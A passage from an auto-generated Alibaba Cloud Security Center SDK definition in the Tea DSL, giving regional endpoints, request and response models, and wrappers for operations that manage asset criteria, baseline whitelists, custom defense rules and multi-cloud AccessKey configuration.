/**
 *
 */
import Util;
import OpenApi;
import OpenApiUtil;
import EndpointUtil;

extends OpenApi;


init(config: OpenApi.Config){
  super(config);
  @endpointRule = 'regional';
  @endpointMap = {
    'cn-qingdao' = 'tds.cn-shanghai.aliyuncs.com',
    'cn-beijing' = 'tds.cn-shanghai.aliyuncs.com',
    'cn-zhangjiakou' = 'tds.cn-shanghai.aliyuncs.com',
    'cn-huhehaote' = 'tds.cn-shanghai.aliyuncs.com',
    'cn-wulanchabu' = 'tds.cn-shanghai.aliyuncs.com',
    'cn-hangzhou' = 'tds.cn-shanghai.aliyuncs.com',
    'cn-shanghai' = 'tds.cn-shanghai.aliyuncs.com',
    'cn-nanjing' = 'tds.cn-shanghai.aliyuncs.com',
    'cn-fuzhou' = 'tds.cn-shanghai.aliyuncs.com',
    'cn-shenzhen' = 'tds.cn-shanghai.aliyuncs.com',
    'cn-heyuan' = 'tds.cn-shanghai.aliyuncs.com',
    'cn-guangzhou' = 'tds.cn-shanghai.aliyuncs.com',
    'ap-southeast-2' = 'tds.ap-southeast-1.aliyuncs.com',
    'ap-southeast-6' = 'tds.ap-southeast-1.aliyuncs.com',
    'ap-northeast-2' = 'tds.ap-southeast-1.aliyuncs.com',
    'ap-southeast-3' = 'tds.ap-southeast-1.aliyuncs.com',
    'ap-northeast-1' = 'tds.ap-southeast-1.aliyuncs.com',
    'ap-southeast-7' = 'tds.ap-southeast-1.aliyuncs.com',
    'cn-chengdu' = 'tds.cn-shanghai.aliyuncs.com',
    'ap-southeast-1' = 'tds.ap-southeast-1.aliyuncs.com',
    'ap-southeast-5' = 'tds.ap-southeast-1.aliyuncs.com',
    'cn-hongkong' = 'tds.cn-shanghai.aliyuncs.com',
    'eu-central-1' = 'tds.ap-southeast-1.aliyuncs.com',
    'us-east-1' = 'tds.ap-southeast-1.aliyuncs.com',
    'us-west-1' = 'tds.ap-southeast-1.aliyuncs.com',
    'eu-west-1' = 'tds.ap-southeast-1.aliyuncs.com',
    'me-east-1' = 'tds.ap-southeast-1.aliyuncs.com',
    'me-central-1' = 'tds.ap-southeast-1.aliyuncs.com',
    'ap-south-1' = 'tds.ap-southeast-1.aliyuncs.com',
    'cn-beijing-finance-1' = 'tds.cn-shanghai.aliyuncs.com',
    'cn-hangzhou-finance' = 'tds.cn-shanghai.aliyuncs.com',
    'cn-shanghai-finance-1' = 'tds.cn-shanghai.aliyuncs.com',
    'cn-shenzhen-finance-1' = 'tds.cn-shanghai.aliyuncs.com',
    'cn-heyuan-acdr-1' = 'tds.cn-shanghai.aliyuncs.com',
    'cn-north-2-gov-1' = 'tds.cn-shanghai.aliyuncs.com',
    'cn-qingdao-acdr-ut-1' = 'tds.cn-shanghai.aliyuncs.com',
    'cn-shanghai-mybk' = 'tds.cn-shanghai.aliyuncs.com',
    'cn-wuhan-lr' = 'tds.cn-shanghai.aliyuncs.com',
    'cn-zhengzhou-jva' = 'tds.cn-shanghai.aliyuncs.com',
  };

  checkConfig(config);
  @endpoint = getEndpoint('sas', @regionId, @endpointRule, @network, @suffix, @endpointMap, @endpoint);
}

function getEndpoint(productId: string, regionId: string, endpointRule: string, network: string, suffix: string, endpointMap: map[string]string, endpoint: string) throws: string{
  if (!Util.empty(endpoint)) {
    return endpoint;
  }
  
  if (!Util.isUnset(endpointMap) && !Util.empty(endpointMap[regionId])) {
    return endpointMap[regionId];
  }
  return EndpointUtil.getEndpointRules(productId, regionId, endpointRule, network, suffix);
}

model QueryIncidentTracingSubNodesCountRequest {
  vertexIdAndTypeList?: [[ string ]  ](name='VertexIdAndTypeList'),
}

model AddAssetSelectionCriteriaRequest {
  criteria?: string(name='Criteria', description='The search conditions that are used to query assets. The value of this parameter is in the JSON format and is case-sensitive.

> A search condition can be an instance ID, instance name, virtual private cloud (VPC) ID, region, or public IP address. You can call the [DescribeCriteria](~~DescribeCriteria~~) operation to query the supported search conditions.', example='{"LogicalExp":"AND","Criteria":"[{\\\\"name\\\\":\\\\"osType\\\\",\\\\"value\\\\":\\\\"linux\\\\",\\\\"logicalExp\\\\":\\\\"AND\\\\"},{\\\\"name\\\\":\\\\"alarmStatus\\\\",\\\\"value\\\\":\\\\"YES\\\\",\\\\"logicalExp\\\\":\\\\"AND\\\\"}]"}'),
  criteriaOperation?: string(name='CriteriaOperation', description='The type of the operation on search conditions. Valid values:

*   **add**: adds assets.
*   **del**: deletes assets.', example='add'),
  selectionKey?: string(name='SelectionKey', description='The unique ID of the asset.

This parameter is required.', example='5196d280-5bfa-496a-ba70-8a3935e3****'),
  targetOperationList?: [ 
    {
      operation?: string(name='Operation', description='The type of the operation. Valid values:

*   **add**
*   **del**', example='del'),
      target?: string(name='Target', description='The ID of the asset.', example='1188****'),
    }
  ](name='TargetOperationList', description='The list of assets.'),
}

model AddAssetSelectionCriteriaResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='7BC55C8F-226E-5AF5-9A2C-2EC43864****'),
}

model AddAssetSelectionCriteriaResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: AddAssetSelectionCriteriaResponseBody(name='body'),
}

/**
 * @summary Select an operation for assets.
 *
 * @param request AddAssetSelectionCriteriaRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return AddAssetSelectionCriteriaResponse
 */
async function addAssetSelectionCriteriaWithOptions(request: AddAssetSelectionCriteriaRequest, runtime: Util.RuntimeOptions): AddAssetSelectionCriteriaResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.criteria)) {
    query['Criteria'] = request.criteria;
  }
  if (!Util.isUnset(request.criteriaOperation)) {
    query['CriteriaOperation'] = request.criteriaOperation;
  }
  if (!Util.isUnset(request.selectionKey)) {
    query['SelectionKey'] = request.selectionKey;
  }
  if (!Util.isUnset(request.targetOperationList)) {
    query['TargetOperationList'] = request.targetOperationList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'AddAssetSelectionCriteria',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Select an operation for assets.
 *
 * @param request AddAssetSelectionCriteriaRequest
 * @return AddAssetSelectionCriteriaResponse
 */
async function addAssetSelectionCriteria(request: AddAssetSelectionCriteriaRequest): AddAssetSelectionCriteriaResponse {
  var runtime = new Util.RuntimeOptions{};
  return addAssetSelectionCriteriaWithOptions(request, runtime);
}

model AddBaselineCheckWhiteRecordRequest {
  checkId?: long(name='CheckId', description='The ID of the check item.

>  You can call the [ListCheckItemWarningSummary](~~ListCheckItemWarningSummary~~) operation to query the IDs of check items.', example='76'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  reason?: string(name='Reason', description='The reason why the check item is added to the whitelist.', example='AutoRun'),
  source?: string(name='Source', description='The data source. If you leave this parameter empty, the default value is used. Valid values:

*   **default**: server
*   **agentless**: agentless detection', example='agentless'),
  targetType?: string(name='TargetType', description='The type of the assets on which the whitelist rule takes effect. Valid values:

*   **all_instance**: all servers
*   **instance**: specific servers', example='instance'),
}

model AddBaselineCheckWhiteRecordResponseBody = {
  data?: {
    checkId?: long(name='CheckId', description='The ID of the check item.

>  You can call the [ListCheckItemWarningSummary](~~ListCheckItemWarningSummary~~) operation to query the IDs of check items.', example='76'),
    lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
    reason?: string(name='Reason', description='The reason why the check item is added to the whitelist.', example='AutoTest'),
    recordId?: long(name='RecordId', description='The ID of the whitelist rule.', example='864153'),
    source?: string(name='Source', description='The data source. Valid values:

*   **default**: server
*   **agentless**: agentless detection', example='agentless'),
    target?: string(name='Target', description='The object that is added to the whitelist.', example='HOST_BASELINE_WHITE_LIST_21'),
    targetType?: string(name='TargetType', description='The type of the assets on which the whitelist rule takes effect. Valid values:

*   **all_instance**: all servers
*   **instance**: specific servers', example='instance'),
  }(name='Data', description='The data returned.'),
  requestId?: string(name='RequestId', description='The request ID.', example='7532B7EE-7CE7-5F4D-BF04-B12447DD****'),
}

model AddBaselineCheckWhiteRecordResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: AddBaselineCheckWhiteRecordResponseBody(name='body'),
}

/**
 * @summary Creates a whitelist rule for a baseline check item.
 *
 * @param request AddBaselineCheckWhiteRecordRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return AddBaselineCheckWhiteRecordResponse
 */
async function addBaselineCheckWhiteRecordWithOptions(request: AddBaselineCheckWhiteRecordRequest, runtime: Util.RuntimeOptions): AddBaselineCheckWhiteRecordResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.checkId)) {
    query['CheckId'] = request.checkId;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.reason)) {
    query['Reason'] = request.reason;
  }
  if (!Util.isUnset(request.source)) {
    query['Source'] = request.source;
  }
  if (!Util.isUnset(request.targetType)) {
    query['TargetType'] = request.targetType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'AddBaselineCheckWhiteRecord',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Creates a whitelist rule for a baseline check item.
 *
 * @param request AddBaselineCheckWhiteRecordRequest
 * @return AddBaselineCheckWhiteRecordResponse
 */
async function addBaselineCheckWhiteRecord(request: AddBaselineCheckWhiteRecordRequest): AddBaselineCheckWhiteRecordResponse {
  var runtime = new Util.RuntimeOptions{};
  return addBaselineCheckWhiteRecordWithOptions(request, runtime);
}

model AddCheckInstanceResultWhiteListRequest {
  checkGroupId?: string(name='CheckGroupId', description='The ID of the group to which the check item belongs.', example='cQFq20UzZ49K6gRSJD1301****'),
  checkId?: long(name='CheckId', description='The ID of the check item.

>  You can call the [ListCheckResult](~~ListCheckResult~~) operation to query the IDs of check items.', example='132'),
  instanceIds?: [ string ](name='InstanceIds', description='The instance IDs of the assets.'),
  instanceList?: [ 
    {
      instanceId?: string(name='InstanceId', description='The instance ID of the asset.

>  You can call the [ListCheckInstanceResult](~~ListCheckInstanceResult~~) operation to query the instance IDs of assets.', example='i-wz9fdluqx20mp2x7****'),
      regionId?: string(name='RegionId', description='The region ID of the asset.

>  You can call the [ListCheckInstanceResult](~~ListCheckInstanceResult~~) operation to query the region ID of the asset.', example='cn-hongkong'),
    }
  ](name='InstanceList', description='The asset instances.'),
  remark?: string(name='Remark', description='The description. The value of this parameter can be up to 65,535 bytes in length.', example='test'),
  ruleType?: string(name='RuleType', description='The type of the rule. Default value: **WHITE**. Valid value:

*   WHITE: adds check items to the whitelist.', example='WHITE'),
}

model AddCheckInstanceResultWhiteListResponseBody = {
  data?: map[string]any(name='Data', description='The data returned. This parameter is deprecated.', example='xxx'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='ADE57832-9666-511C-9A80-B87DE2E8****'),
  ruleId?: string(name='RuleId', description='The ID of the whitelist rule.', example='381049'),
}

model AddCheckInstanceResultWhiteListResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: AddCheckInstanceResultWhiteListResponseBody(name='body'),
}

/**
 * @summary Adds instances on which risks are detected based on check items of the configuration assessment feature to a whitelist.
 *
 * @param request AddCheckInstanceResultWhiteListRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return AddCheckInstanceResultWhiteListResponse
 */
async function addCheckInstanceResultWhiteListWithOptions(request: AddCheckInstanceResultWhiteListRequest, runtime: Util.RuntimeOptions): AddCheckInstanceResultWhiteListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.checkGroupId)) {
    query['CheckGroupId'] = request.checkGroupId;
  }
  if (!Util.isUnset(request.checkId)) {
    query['CheckId'] = request.checkId;
  }
  if (!Util.isUnset(request.instanceIds)) {
    query['InstanceIds'] = request.instanceIds;
  }
  if (!Util.isUnset(request.instanceList)) {
    query['InstanceList'] = request.instanceList;
  }
  if (!Util.isUnset(request.remark)) {
    query['Remark'] = request.remark;
  }
  if (!Util.isUnset(request.ruleType)) {
    query['RuleType'] = request.ruleType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'AddCheckInstanceResultWhiteList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Adds instances on which risks are detected based on check items of the configuration assessment feature to a whitelist.
 *
 * @param request AddCheckInstanceResultWhiteListRequest
 * @return AddCheckInstanceResultWhiteListResponse
 */
async function addCheckInstanceResultWhiteList(request: AddCheckInstanceResultWhiteListRequest): AddCheckInstanceResultWhiteListResponse {
  var runtime = new Util.RuntimeOptions{};
  return addCheckInstanceResultWhiteListWithOptions(request, runtime);
}

model AddCheckResultWhiteListRequest {
  checkIds?: [ long ](name='CheckIds', description='The IDs of the check items.

>  You can call the [ListCheckResult](~~ListCheckResult~~) operation to query the IDs of the check items.'),
  remark?: string(name='Remark', description='The description. The value of this parameter can be up to 65,535 bytes in length.', example='test'),
  ruleType?: string(name='RuleType', description='The type of the rule. Default value: **WHITE**. Valid value:

*   **WHITE**: Add check items to the whitelist.', example='WHITE'),
}

model AddCheckResultWhiteListResponseBody = {
  data?: map[string]any(name='Data', description='The data returned. This parameter is deprecated.', example='1'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='C699E4E4-F2F4-58FC-A949-457FFE59****'),
  ruleIds?: [ long ](name='RuleIds', description='The IDs of the whitelist rules that are generated.'),
}

model AddCheckResultWhiteListResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: AddCheckResultWhiteListResponseBody(name='body'),
}

/**
 * @summary Adds the check items of the configuration assessment feature to the whitelist.
 *
 * @param request AddCheckResultWhiteListRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return AddCheckResultWhiteListResponse
 */
async function addCheckResultWhiteListWithOptions(request: AddCheckResultWhiteListRequest, runtime: Util.RuntimeOptions): AddCheckResultWhiteListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.checkIds)) {
    query['CheckIds'] = request.checkIds;
  }
  if (!Util.isUnset(request.remark)) {
    query['Remark'] = request.remark;
  }
  if (!Util.isUnset(request.ruleType)) {
    query['RuleType'] = request.ruleType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'AddCheckResultWhiteList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Adds the check items of the configuration assessment feature to the whitelist.
 *
 * @param request AddCheckResultWhiteListRequest
 * @return AddCheckResultWhiteListResponse
 */
async function addCheckResultWhiteList(request: AddCheckResultWhiteListRequest): AddCheckResultWhiteListResponse {
  var runtime = new Util.RuntimeOptions{};
  return addCheckResultWhiteListWithOptions(request, runtime);
}

model AddClientUserDefineRuleRequest {
  actionType?: int32(name='ActionType', description='The action of the custom defense rule. Valid values:

*   **0**: allow
*   **1**: block

This parameter is required.', example='1'),
  cmdline?: string(name='Cmdline', description='The command line.', example='/usr/sbin/s****'),
  domain?: string(name='Domain', description='The domain name.', example='example.com'),
  filePath?: string(name='FilePath', description='The file path.', example='/etc/pam****'),
  IP?: string(name='IP', description='The IP address.', example='10.240.XX.XX'),
  md5List?: string(name='Md5List', description='The hash values of processes.', example='0c9045b5bec90f9825f1f3f64dd4****'),
  name?: string(name='Name', description='The name of the custom defense rule.

This parameter is required.', example='Rule 1'),
  newFilePath?: string(name='NewFilePath', description='The new file path after the file is renamed.', example='/etc/pam****'),
  parentCmdline?: string(name='ParentCmdline', description='The parent command line.', example='/usr/sbin/s****'),
  parentProcPath?: string(name='ParentProcPath', description='The path to the parent process.', example='c:/windows/system32/i****'),
  platform?: string(name='Platform', description='The type of the operating system. Valid values:

*   **windows**: Windows
*   **linux**: Linux
*   **all**: all types', example='linux'),
  port?: int32(name='Port', description='The port number. This parameter is deprecated.', example='22'),
  portStr?: string(name='PortStr', description='The port number. Valid values: **1 to 65535**.', example='80'),
  procPath?: string(name='ProcPath', description='The path to the process.', example='c:/windows/system32/i****'),
  registryContent?: string(name='RegistryContent', description='The registry value.', example='*SECOH-QAD.exe*'),
  registryKey?: string(name='RegistryKey', description='The registry key.', example='HKEY_DYN_****'),
  type?: int32(name='Type', description='The type of the custom defense rule. Valid values:

*   **1**: Process hash
*   **2**: Command line
*   **3**: Process Network
*   **4**: File Read and Write
*   **5**: Operation on Registry
*   **6**: Dynamic-link Library Loading
*   **7**: File Renaming

This parameter is required.', example='1'),
}

model AddClientUserDefineRuleResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request.', example='379a9b8f-107b-4630-9e95-2299a1ea****'),
  userDefineRuleAddResult?: {
    id?: long(name='Id', description='The ID of the rule.', example='1'),
    platform?: string(name='Platform', description='The type of the operating system. Valid values:

*   **windows**: Windows
*   **linux**: Linux
*   **all**: all types', example='linux'),
    switchId?: string(name='SwitchId', description='The switch ID of the custom defense rule.', example='USER-DEFINE-RULE-SWITCH-TYPE_200****'),
  }(name='UserDefineRuleAddResult', description='The identifier of the custom defense rule.'),
}

model AddClientUserDefineRuleResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: AddClientUserDefineRuleResponseBody(name='body'),
}

/**
 * @summary Creates a custom defense rule.
 *
 * @param request AddClientUserDefineRuleRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return AddClientUserDefineRuleResponse
 */
async function addClientUserDefineRuleWithOptions(request: AddClientUserDefineRuleRequest, runtime: Util.RuntimeOptions): AddClientUserDefineRuleResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.actionType)) {
    query['ActionType'] = request.actionType;
  }
  if (!Util.isUnset(request.cmdline)) {
    query['Cmdline'] = request.cmdline;
  }
  if (!Util.isUnset(request.domain)) {
    query['Domain'] = request.domain;
  }
  if (!Util.isUnset(request.filePath)) {
    query['FilePath'] = request.filePath;
  }
  if (!Util.isUnset(request.IP)) {
    query['IP'] = request.IP;
  }
  if (!Util.isUnset(request.md5List)) {
    query['Md5List'] = request.md5List;
  }
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.newFilePath)) {
    query['NewFilePath'] = request.newFilePath;
  }
  if (!Util.isUnset(request.parentCmdline)) {
    query['ParentCmdline'] = request.parentCmdline;
  }
  if (!Util.isUnset(request.parentProcPath)) {
    query['ParentProcPath'] = request.parentProcPath;
  }
  if (!Util.isUnset(request.platform)) {
    query['Platform'] = request.platform;
  }
  if (!Util.isUnset(request.port)) {
    query['Port'] = request.port;
  }
  if (!Util.isUnset(request.portStr)) {
    query['PortStr'] = request.portStr;
  }
  if (!Util.isUnset(request.procPath)) {
    query['ProcPath'] = request.procPath;
  }
  if (!Util.isUnset(request.registryContent)) {
    query['RegistryContent'] = request.registryContent;
  }
  if (!Util.isUnset(request.registryKey)) {
    query['RegistryKey'] = request.registryKey;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'AddClientUserDefineRule',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Creates a custom defense rule.
 *
 * @param request AddClientUserDefineRuleRequest
 * @return AddClientUserDefineRuleResponse
 */
async function addClientUserDefineRule(request: AddClientUserDefineRuleRequest): AddClientUserDefineRuleResponse {
  var runtime = new Util.RuntimeOptions{};
  return addClientUserDefineRuleWithOptions(request, runtime);
}

model AddCloudVendorAccountAKRequest {
  akType?: string(name='AkType', description='The type of the account to which the AccessKey pair belongs. Valid values:

*   **primary**: a primary account
*   **sub**: a sub-account

This parameter is required.', example='primary'),
  authModules?: [ string ](name='AuthModules', description='The modules that are associated with the AccessKey pair.'),
  domain?: string(name='Domain', description='The Active Directory (AD) domain. This parameter takes effect only when Vendor is set to Azure. Valid values:

*   **china**
*   **global**', example='global'),
  lang?: string(name='Lang', description='The language of the content in the request and response messages. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  regions?: [ string ](name='Regions', description='The regions that are examined during AccessKey pair authentication. This parameter takes effect only when Vendor is set to AWS.

>  You can call the [ListCloudVendorRegions](~~ListCloudVendorRegions~~) operation to query regions.'),
  secretId?: string(name='SecretId', description='The AccessKey ID. Valid values:

1\\\\. If AkType is set to primary, specify this parameter based on the following description:

*   **Tencent**: Enter the AccessKey ID of a primary account on Tencent Cloud.
*   **HUAWEICLOUD**: Enter the AccessKey ID of a primary account on Huawei Cloud.
*   **Azure**: Enter the AccessKey ID of a primary account on Microsoft Azure.
*   **AWS**: Enter the AccessKey ID of a primary account on AWS.

2\\\\. If AkType is set to sub, specify this parameter based on the following description:

*   **Tencent**: Enter the AccessKey ID of a sub-account on Tencent Cloud.
*   **HUAWEICLOUD**: Enter the AccessKey ID of a sub-account on Huawei Cloud.
*   **Azure**: Enter the AccessKey ID of a sub-account on Microsoft Azure.
*   **AWS**: Enter the AccessKey ID of a sub-account on AWS.

This parameter is required.', example='45GLRV4SOT0YFB****'),
  secretKey?: string(name='SecretKey', description='The AccessKey secret. Valid values:

1\\\\. If AkType is set to primary, specify this parameter based on the following description:

*   **Tencent**: Enter the AccessKey secret of a primary account on Tencent Cloud.
*   **HUAWEICLOUD**: Enter the AccessKey secret of a primary account on Huawei Cloud.
*   **Azure**: Enter the AccessKey secret of a primary account on Microsoft Azure.
*   **AWS**: Enter the AccessKey secret of a primary account on AWS.

2\\\\. If AkType is set to sub, specify this parameter based on the following description:

*   **Tencent**: Enter the AccessKey secret of a sub-account on Tencent Cloud.
*   **HUAWEICLOUD**: Enter the AccessKey secret of a sub-account on Huawei Cloud.
*   **Azure**: Enter the AccessKey secret of a sub-account on Microsoft Azure.
*   **AWS**: Enter the AccessKey secret of a sub-account on AWS.

This parameter is required.', example='AE6SLd****'),
  subscriptionIds?: [ string ](name='SubscriptionIds', description='The subscription IDs. This parameter takes effect only when Vendor is set to Azure.'),
  tenantId?: string(name='TenantId', description='The tenant ID. This parameter takes effect only when Vendor is set to Azure.', example='95304a97-339b-4de5-9a7d-cdbffaf****'),
  vendor?: string(name='Vendor', description='The cloud service provider. Valid values:

*   **Tencent**: Tencent Cloud
*   **HUAWEICLOUD**: Huawei Cloud
*   **Azure**: Microsoft Azure
*   **AWS**: Amazon Web Services (AWS)

This parameter is required.', example='AWS'),
  vendorAuthAlias?: string(name='VendorAuthAlias', description='The name of the AccessKey pair.

>  The account information of the third-party cloud servers.', example='test'),
}

model AddCloudVendorAccountAKResponseBody = {
  data?: {
    akType?: string(name='AkType', description='The type of the account to which the AccessKey pair belongs. Valid values:

*   **primary**: a primary account
*   **sub**: a sub-account', example='sub'),
    authId?: long(name='AuthId', description='The unique ID of the AccessKey pair.', example='2158'),
    authModules?: [ 
      {
        message?: string(name='Message', description='The error message of the module.', example='ak_domain_error'),
        module?: string(name='Module', description='The code of the module. Valid values:

*   **HOST**: host
*   **CSPM**: configuration assessment
*   **SIEM**: CloudSiem
*   **TRIAL**: log audit', example='HOST'),
        moduleAssetType?: string(name='ModuleAssetType', description='The cloud asset that is associated with the module.', example='Cloud server or virtual machine'),
        moduleDisp?: string(name='ModuleDisp', description='The display name of the module.', example='Host Assets'),
        moduleServiceStatus?: int32(name='ModuleServiceStatus', description='The service status of the module. Valid values:

*   **0**: being used
*   **1**: exception occurred
*   **2**: being validated
*   **3**: validation timed out', example='0'),
        moduleStatement?: string(name='ModuleStatement', description='The permission description of the module.', example='Read permission of the cloud server or virtual machine'),
      }
    ](name='AuthModules', description='The modules that are associated with the AccessKey pair.'),
    message?: string(name='Message', description='The error message of the AccessKey pair.', example='The IAM user is forbidden in the currently selected region'),
    secretId?: string(name='SecretId', description='The AccessKey ID.', example='AE6SLd****'),
    serviceStatus?: int32(name='ServiceStatus', description='The service status of the AccessKey pair. Valid values:

*   **0**: being used
*   **1**: exception occurred
*   **2**: being validated
*   **3**: validation timed out', example='0'),
    status?: int32(name='Status', description='The status of the AccessKey pair. Valid values:

*   **0**: enabled
*   **1**: disabled', example='0'),
    vendor?: string(name='Vendor', description='The cloud service provider. Valid values:

*   **Tencent**: Tencent Cloud
*   **HUAWEICLOUD**: Huawei Cloud
*   **Azure**: Microsoft Azure
*   **AWS**: AWS', example='Tencent'),
    vendorAuthAlias?: string(name='VendorAuthAlias', description='The name of the AccessKey pair.

>  The account information of the third-party cloud servers.', example='test'),
  }(name='Data', description='The information about the AccessKey pair that is added.'),
  requestId?: string(name='RequestId', description='The request ID.', example='A60DA4EC-7CD8-577D-AD73-***'),
}

model AddCloudVendorAccountAKResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: AddCloudVendorAccountAKResponseBody(name='body'),
}

/**
 * @summary Adds the configuration information of multi-cloud assets.
 *
 * @param request AddCloudVendorAccountAKRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return AddCloudVendorAccountAKResponse
 */
async function addCloudVendorAccountAKWithOptions(request: AddCloudVendorAccountAKRequest, runtime: Util.RuntimeOptions): AddCloudVendorAccountAKResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.akType)) {
    query['AkType'] = request.akType;
  }
  if (!Util.isUnset(request.authModules)) {
    query['AuthModules'] = request.authModules;
  }
  if (!Util.isUnset(request.domain)) {
    query['Domain'] = request.domain;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.regions)) {
    query['Regions'] = request.regions;
  }
  if (!Util.isUnset(request.secretId)) {
    query['SecretId'] = request.secretId;
  }
  if (!Util.isUnset(request.secretKey)) {
    query['SecretKey'] = request.secretKey;
  }
  if (!Util.isUnset(request.subscriptionIds)) {
    query['SubscriptionIds'] = request.subscriptionIds;
  }
  if (!Util.isUnset(request.tenantId)) {
    query['TenantId'] = request.tenantId;
  }
  if (!Util.isUnset(request.vendor)) {
    query['Vendor'] = request.vendor;
  }
  if (!Util.isUnset(request.vendorAuthAlias)) {
    query['VendorAuthAlias'] = request.vendorAuthAlias;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'AddCloudVendorAccountAK',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Adds the configuration information of multi-cloud assets.
 *
 * @param request AddCloudVendorAccountAKRequest
 * @return AddCloudVendorAccountAKResponse
 */
async function addCloudVendorAccountAK(request: AddCloudVendorAccountAKRequest): AddCloudVendorAccountAKResponse {
  var runtime = new Util.RuntimeOptions{};
  return addCloudVendorAccountAKWithOptions(request, runtime);
}

model AddCloudVendorTrialConfigRequest {
  authId?: long(name='AuthId', description='Unique ID of the AK.

> You can call [DescribeCloudVendorAccountAKList](~~DescribeCloudVendorAccountAKList~~) to get the AuthId.
> -

This parameter is required.', example='2363'),
  authInfo?: string(name='AuthInfo', description='Enter multi-cloud configuration information:
- *AWS*: Parameters include sqsQueueName, sqsRegion
- *Tencent*: Parameters include kafkaUserName, kafkaBootstrapServers, kafkaTopic

This parameter is required.', example='{\\\\"sqsRegion\\\\":\\\\"us-west-2\\\\",\\\\"sqsQueueName\\\\":\\\\"****\\\\"}'),
  vendor?: string(name='Vendor', description='Cloud asset vendor. Values:

- **Tencent**: Tencent Cloud
- **AWS**: AWS (Note: The original text incorrectly states \\\\"Microsoft\\\\", which should be \\\\"AWS\\\\" based on context.)

This parameter is required.', example='Tencent'),
}

model AddCloudVendorTrialConfigResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7BC55C8F-226E-5AF5-9A2C-2EC43864****'),
}

